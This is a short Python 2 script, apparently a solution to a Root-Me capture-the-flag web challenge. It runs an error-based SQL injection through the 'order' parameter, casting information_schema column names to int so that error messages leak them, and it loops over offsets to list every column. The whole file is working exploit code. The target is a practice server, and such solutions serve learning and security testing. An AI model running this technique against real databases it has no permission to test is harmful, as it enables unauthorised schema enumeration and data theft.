import requests
import sys

URL = "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"

for i in range(0,1000):
	query ='ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
	PARAMS ={'action':'contents','order':query}
	http  = requests.get(url = URL,params = PARAMS)
	content = http.content
	content = content.replace("</body></html>","")
	print "column of table is :" + content[441:]
